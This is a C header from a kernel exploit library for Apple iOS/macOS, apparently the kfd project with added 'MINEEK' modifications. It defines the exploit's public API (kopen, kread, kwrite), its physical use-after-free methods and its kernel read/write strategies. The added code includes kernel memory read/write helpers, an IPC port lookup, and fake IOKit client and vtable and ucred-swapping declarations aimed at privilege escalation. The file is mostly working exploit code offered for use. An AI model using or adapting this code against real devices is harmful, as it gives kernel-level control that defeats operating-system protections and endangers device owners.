/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef libkfd_h
#define libkfd_h

/*
 * The global configuration parameters of libkfd.
 */
#define CONFIG_ASSERT 1
#define CONFIG_PRINT 1
#define CONFIG_TIMER 1

#include "libkfd/common.h"
#import <sys/cdefs.h>
#include <stdio.h>

/*
 * The public API of libkfd.
 */

enum puaf_method {
    puaf_physpuppet,
    puaf_smith,
};

enum kread_method {
    kread_kqueue_workloop_ctl,
    kread_sem_open,
    kread_IOSurface,
};

enum kwrite_method {
    kwrite_dup,
    kwrite_sem_open,
    kwrite_IOSurface,
};

u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method);
void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size);
void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size);
void kclose(u64 kfd);

/*
 * The private API of libkfd.
 */

struct kfd; // Forward declaration for function pointers.

struct info {
    struct {
        vm_address_t src_uaddr;
        vm_address_t dst_uaddr;
        vm_size_t size;
    } copy;
    struct {
        i32 pid;
        u64 tid;
        u64 vid;
        bool ios;
        char osversion[8];
        u64 maxfilesperproc;
    } env;
    struct {
        u64 kernel_slide;
        u64 gVirtBase;
        u64 gPhysBase;
        u64 gPhysSize;
        struct {
            u64 pa;
            u64 va;
        } ttbr[2];
        struct ptov_table_entry {
            u64 pa;
            u64 va;
            u64 len;
        } ptov_table[8];

        u64 current_map;
        u64 current_pmap;
        u64 current_proc;
        u64 current_task;
        u64 current_thread;
        u64 current_uthread;
        u64 kernel_map;
        u64 kernel_pmap;
        u64 kernel_proc;
        u64 kernel_task;
    } kernel;
};

struct perf {
    u64 kernelcache_index;
    struct {
        u64 kaddr;
        u64 paddr;
        u64 uaddr;
        u64 size;
    } shared_page;
    struct {
        i32 fd;
        u32 si_rdev_buffer[2];
        u64 si_rdev_kaddr;
    } dev;
    void (*saved_kread)(struct kfd*, u64, void*, u64);
    void (*saved_kwrite)(struct kfd*, void*, u64, u64);
};

struct puaf {
    u64 number_of_puaf_pages;
    u64* puaf_pages_uaddr;
    void* puaf_method_data;
    u64 puaf_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*run)(struct kfd*);
        void (*cleanup)(struct kfd*);
        void (*free)(struct kfd*);
    } puaf_method_ops;
};

struct krkw {
    u64 krkw_maximum_id;
    u64 krkw_allocated_id;
    u64 krkw_searched_id;
    u64 krkw_object_id;
    u64 krkw_object_uaddr;
    u64 krkw_object_size;
    void* krkw_method_data;
    u64 krkw_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*allocate)(struct kfd*, u64);
        bool (*search)(struct kfd*, u64);
        void (*kread)(struct kfd*, u64, void*, u64);
        void (*kwrite)(struct kfd*, void*, u64, u64);
        void (*find_proc)(struct kfd*);
        void (*deallocate)(struct kfd*, u64);
        void (*free)(struct kfd*);
    } krkw_method_ops;
};

struct kfd {
    struct info info;
    struct perf perf;
    struct puaf puaf;
    struct krkw kread;
    struct krkw kwrite;
};

#include "libkfd/info.h"
#include "libkfd/puaf.h"
#include "libkfd/krkw.h"
#include "libkfd/perf.h"

struct kfd* kfd_init(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
    info_init(kfd);
    puaf_init(kfd, puaf_pages, puaf_method);
    krkw_init(kfd, kread_method, kwrite_method);
    perf_init(kfd);
    return kfd;
}

void kfd_free(struct kfd* kfd)
{
    perf_free(kfd);
    krkw_free(kfd);
    puaf_free(kfd);
    info_free(kfd);
    bzero_free(kfd, sizeof(struct kfd));
}
#import "fun/krw.h"

u64 kopen_intermediate(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    return do_kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
    //return kopen(puaf_pages, puaf_method, kread_method, kwrite_method);
}

void kclose_intermediate(u64 kfd)
{
    return kclose(kfd);
}


u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
   // timer_start();
/*
    const u64 puaf_pages_min = 16;
    const u64 puaf_pages_max = 2048;
    assert(puaf_pages >= puaf_pages_min);
    assert(puaf_pages <= puaf_pages_max);
    assert(puaf_method <= puaf_smith);
    assert(kread_method <= kread_IOSurface);
    assert(kwrite_method <= kwrite_IOSurface);
*/
    struct kfd* kfd = kfd_init(0x760, puaf_smith, kread_IOSurface, kwrite_IOSurface);;//kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
    puaf_run(kfd);
    krkw_run(kfd);
    info_run(kfd);
    perf_run(kfd);
    puaf_cleanup(kfd);
    //printf("you get here");
    //timer_end();
    return (u64)(kfd);
}

void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
{
    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
}

void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
{
    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
}

void kclose(u64 kfd)
{
    kfd_free((struct kfd*)(kfd));
}

// BEGIN MINEEK CHANGES
#include "IOKit.h"
#include "mineekpf.h"
#include "offsetcache.h"
#include "fun/offsets.h"
//#include "util/utilsZS.h"

mach_port_t user_client;
uint64_t fake_client;
uint64_t fake_vtable;
uint64_t add_x0_x0_0x40_ret_func = 0;
//uint64_t groot_ogucredof_proc;
uint64_t proc_set_ucred_func;


uint32_t rk32(u64 kfd, uint64_t where) {
    uint32_t out;
    kread(kfd, where, &out, sizeof(uint32_t));
    return out;
}

uint64_t rk64(u64 kfd, uint64_t where) {
    uint64_t out;
    kread(kfd, where, &out, sizeof(uint64_t));
    return out;
}

void wk32(u64 kfd, uint64_t where, uint32_t what)
{
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = rk32(kfd, where+4);
    kwrite(kfd, &_buf, where, sizeof(u64));
}

void wk64(u64 kfd, uint64_t where, uint64_t what)
{
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite(kfd, &_buf, where, sizeof(u64));
}

uint64_t find_port(u64 kfd, mach_port_name_t port){
    struct kfd* kfd_struct = (struct kfd*)kfd;
    uint64_t task_addr = kfd_struct->info.kernel.current_task;
    uint64_t itk_space = rk64(kfd, task_addr + off_task_itk_space);
    uint64_t is_table = rk64(kfd, itk_space + 0x20);
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint64_t port_addr = rk64(kfd, is_table + (port_index * sizeof_ipc_entry_t));
    return port_addr;
}



uint64_t clean_dirty_kalloc(uint64_t addr, size_t size) {
    for(int i = 0; i < size; i+=8) {
        kwrite64(addr + i, 0);
    }
    return 0;
}


uint64_t kernel_slide(uint64_t kfd)
{
    return ((struct kfd*)kfd)->info.kernel.kernel_slide;
}


#endif /* libkfd_h */
